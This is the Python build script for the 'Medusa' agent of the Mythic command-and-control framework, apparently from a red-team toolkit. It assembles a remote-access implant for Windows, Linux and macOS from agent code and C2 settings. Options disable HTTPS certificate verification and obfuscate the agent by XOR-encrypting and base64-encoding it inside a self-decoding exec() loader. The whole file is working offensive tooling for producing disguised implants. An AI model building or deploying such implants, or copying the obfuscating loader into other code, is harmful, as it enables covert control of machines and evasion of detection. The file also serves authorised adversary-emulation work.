from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
import asyncio
import os
from distutils.dir_util import copy_tree
import tempfile
import base64, hashlib
from itertools import cycle

class Medusa(PayloadType):

    name = "medusa" 
    file_extension = "py"
    author = "@ajpc500"
    supported_os = [  
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False  
    wrapped_payloads = []  
    mythic_encrypts = True
    note = "This payload uses Python to create a simple agent"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "base64"],
        ),
        BuildParameter(
            name="python_version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose Python version",
            choices=["Python 3.8", "Python 2.7"],
        ),
        BuildParameter(
            name="use_non_default_cryptography_lib",
            parameter_type=BuildParameterType.ChooseOne,
            description="Use non-default 'cryptography' Python library for comms (if not, manual crypto will be used)",
            choices=["No", "Yes"],
        ),
        BuildParameter(
            name="obfuscate_script",
            parameter_type=BuildParameterType.ChooseOne,
            description="XOR and Base64-encode agent code",
            choices=["Yes", "No"],
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
        )
    ]
    c2_profiles = ["http"]
    translation_container = None
    support_browser_scripts = [
        BrowserScript(script_name="create_table", author="@its_a_feature_"),
        BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
        BrowserScript(script_name="file_size_to_human_readable_string", author="@djhohnstein")
    ]

    def getPythonVersionFile(self, directory, file):
        pyv = self.get_parameter("python_version")
        filename = ""
        if os.path.exists(os.path.join(directory, "{}.py".format(file))):
            #while we've specified a python version, this function is agnostic so just return the .py
            filename = os.path.join(directory, "{}.py".format(file))
        elif pyv == "Python 2.7":
            filename = os.path.join(directory, "{}.py2".format(file))
        elif pyv == "Python 3.8":
            filename = os.path.join(directory, "{}.py3".format(file))
            
        if not os.path.exists(filename) or not filename:
            return ""
        else:
            return filename         

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""
        try:
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.getPythonVersionFile(self.agent_code_path, cmd)
                if not command_path:
                    build_msg += "{} command not available for {}.\n".format(cmd, self.get_parameter("python_version"))
                else:
                    command_code += (
                        open(command_path, "r").read() + "\n"
                    )
            base_code = open(
                self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "base_agent"), "r"
            ).read()

            if self.get_parameter("use_non_default_cryptography_lib") == "Yes":
                crypto_code = open(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib"), "r").read()
            else:
                crypto_code = open(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto"), "r").read()

            base_code = base_code.replace("CRYPTO_HERE", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_HERE", command_code)
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                for key, val in c2.get_parameters_dict().items():
                    if not isinstance(val, str):
                        base_code = base_code.replace(key, \
                            json.dumps(val).replace("false", "False").replace("true","True").replace("null","None"))
                    else:
                        base_code = base_code.replace(key, val)

            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")

            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)

            if self.get_parameter("obfuscate_script") == "Yes":
                key = hashlib.md5(os.urandom(128)).hexdigest().encode()
                encrypted_content = ''.join(chr(c^k) for c,k in zip(base_code.encode(), cycle(key))).encode()
                b64_enc_content = base64.b64encode(encrypted_content)
                xor_func = "chr(c^k)" if self.get_parameter("python_version") == "Python 3.8" else "chr(ord(c)^ord(k))"
                base_code = """import base64, itertools
exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())
""".format(xor_func, b64_enc_content, key)

            if self.get_parameter("output") == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully Built"
            else:
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built!"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

